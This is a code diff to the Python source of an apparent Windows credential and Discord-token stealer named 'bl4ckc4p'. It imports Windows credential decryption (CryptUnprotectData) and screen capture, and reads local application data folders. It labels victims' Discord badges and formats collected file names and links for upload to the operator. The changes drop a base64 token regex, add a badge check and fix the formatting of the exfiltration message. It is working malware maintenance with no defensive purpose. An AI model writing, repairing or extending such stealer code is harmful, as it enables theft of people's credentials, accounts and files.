@@ -34,12 +34,10 @@ from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 
 
-
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 temp = os.getenv("TEMP")
-regex = base64.b64encode(
-    b'W01OXVtBLVphLXpcZF17MjN9XC5bXHctXXs2fVwuW1x3LV17Mjd9');
+
 Passw = [];
 
 # `
@@ -863,6 +861,8 @@ class bl4ckc4p(Functions):
                 badges += "Gold BugHunter, "
             if (flags == 131072):
                 badges += "Verified Bot Developer, "
+            if (flags == 4194304):
+                badges += "Active Developer, "
             if (badges == ""):
                 badges = "None"
 
@@ -1648,12 +1648,14 @@ if not DETECTED:
         if len(arg[2]) != 0:
             foldpath = arg[1]
             foldlist = arg[2]
-            filetext += f"```diff\n- {foldpath}\n"
+            filetext +=f"```diff\n"
+            filetext += f"- {foldpath}\n"
 
             for ffil in foldlist:
                 a = ffil[0].split("/")
                 fileanme = a[len(a)-1]
                 b = ffil[1]
-                filetext += f"+ Name: {fileanme}\n+ Link: {b}\n```"
-            filetext += "\n"
+                filetext += f"+ Name: {fileanme}\n+ Link: {b}"
+                filetext += "\n```"
+                filetext += "\n"
     upload("blackcapedez", filetext)
